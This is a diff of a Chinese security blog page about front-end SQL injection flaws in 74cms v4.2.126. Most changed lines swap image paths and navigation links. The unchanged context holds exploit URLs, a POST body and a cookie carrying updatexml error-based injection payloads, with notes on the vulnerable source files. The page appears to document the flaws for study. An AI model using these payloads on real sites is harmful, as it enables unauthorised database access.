+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId38.png"></p>
 <p>注册完成以后登录前台即可如果不登录的话，会显示这个样子url:<a target="_blank" rel="noopener" href="http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company%5C_focus">http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company\_focus</a></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId39.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId39.png"></p>
 <pre><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId40.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId40.png"></p>
 <p>看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId41.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId41.png"></p>
 <p>打开文件：<br>74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId42.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId42.png"></p>
 <h2 id="0x05-74cms独有框架漏洞第二处"><a href="#0x05-74cms独有框架漏洞第二处" class="headerlink" title="0x05 74cms独有框架漏洞第二处"></a>0x05 74cms独有框架漏洞第二处</h2><p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
 <p>image</p>
 <p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId44.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId45.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId44.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId45.png"></p>
 <p>注册完成以后登录前台即可</p>
 <pre><code>url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
 
 如果不登录的话，会显示这个样子
 url:http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId46.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId46.png"></p>
 <pre><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId47.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId47.png"></p>
 <p>看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId48.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId48.png"></p>
 <p>打开文件：<br>74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId49.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId49.png"></p>
 <h2 id="0x06-74cms独有框架漏洞第二处"><a href="#0x06-74cms独有框架漏洞第二处" class="headerlink" title="0x06 74cms独有框架漏洞第二处"></a>0x06 74cms独有框架漏洞第二处</h2><p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId51.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId51.png"></p>
 <p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId52.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId53.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId54.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId52.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId53.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId54.png"></p>
 <p>注册完成以后登录前台即可</p>
 <pre><code>url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) – a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId55.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId55.png"></p>
 <h2 id="0x07-74cms独有框架漏洞第三处"><a href="#0x07-74cms独有框架漏洞第三处" class="headerlink" title="0x07 74cms独有框架漏洞第三处"></a>0x07 74cms独有框架漏洞第三处</h2><p>文件：74cms\upload\Application\Home\Controller\MembersController.class.php方法：register(是否需登录：不需要</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId57.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId57.png"></p>
 <pre><code>url: 
 http://74cms.test/index.php?m=&amp;c=Members&amp;a=register
 post: 
@@ -445,7 +445,7 @@ members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=
 headers:
   Content-Type: application/x-www-form-urlencoded
   X-Requested-With: XMLHttpRequest</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId58.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId58.png"></p>
 <pre><code>这里我要大概讲一下参数的问题
 post: 
 reg_type=2            // 必须为2 为了绕过一个注册判断，为1的话，会直接创建帐户，导致无法利用漏洞
@@ -473,11 +473,11 @@ post:
 cookie:
     members_bind_info[type][0]=match;
 members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId60.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId61.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId60.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId61.png"></p>
 <p>看源码</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId62.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId63.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId62.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId63.png"></p>
 <h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl">https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl</a></p>
 </blockquote>
@@ -497,13 +497,13 @@ members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select us
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/01/12/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" rel="prev" title="74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞">
-                  <i class="fa fa-chevron-left"></i> 74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞
+                <a href="/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" rel="prev" title="74cms v4.2.1-v4.2.129-后台getshell漏洞">
+                  <i class="fa fa-chevron-left"></i> 74cms v4.2.1-v4.2.129-后台getshell漏洞
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" rel="next" title="74cms v4.2.1-v4.2.129-后台getshell漏洞">
-                  74cms v4.2.1-v4.2.129-后台getshell漏洞 <i class="fa fa-chevron-right"></i>
+                <a href="/2021/01/12/(CVE-2015-5254)ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="next" title="（CVE-2015-5254）ActiveMQ 反序列化漏洞">
+                  （CVE-2015-5254）ActiveMQ 反序列化漏洞 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
